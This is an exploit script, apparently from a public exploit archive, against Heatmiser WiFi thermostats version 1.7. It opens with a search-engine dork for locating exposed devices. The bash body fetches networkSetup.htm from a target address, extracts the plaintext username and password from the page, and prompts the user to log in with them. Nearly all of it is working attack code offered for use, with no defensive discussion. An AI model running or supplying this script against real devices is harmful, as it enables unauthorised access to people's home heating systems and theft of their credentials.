# Dork: intitle:"Heatmiser Wifi Thermostat"
# Exploit Author: d0wnp0ur
# Original Discoverer: Andrew Tierney
# Vendor Lnk: https://www.heatmiser.com/en/ 
# Product Link: https://www.heatmiser.com/en/wireless-thermostats/
# Tested on: Heatmiser Version 1.7
# CVE: N/A
 
#!/bin/bash
 
echo Heatmiser Smart Thermometer Hack
echo By d0wnp0ur
echo Usage: $0 \<ip\[:port\]\> \(Default is 80. If it doesn\&#039;t work, try port 8081\)
echo This tool gets the username and password of a vulnerable Heatmiser thermostat
echo Deleting old files
rm networkSetup.htm*
echo Copying disclosing page
wget http://$1/networkSetup.htm
echo Getting Username and Password
echo Username:
cat networkSetup.htm | grep "User" | grep "Name:" | awk -F &#039;value=&#039; &#039;{print $2}&#039; | cut -d &#039;"&#039; -f 2
echo Password:
cat networkSetup.htm | grep "User" | grep "Password:" |grep -v -i "confirm" |  awk -F &#039;value=&#039; &#039;{print $2}&#039; | cut -d &#039;"&#039; -f 2
echo Success! Log in to the web interface with the above credentials.
echo http://$1

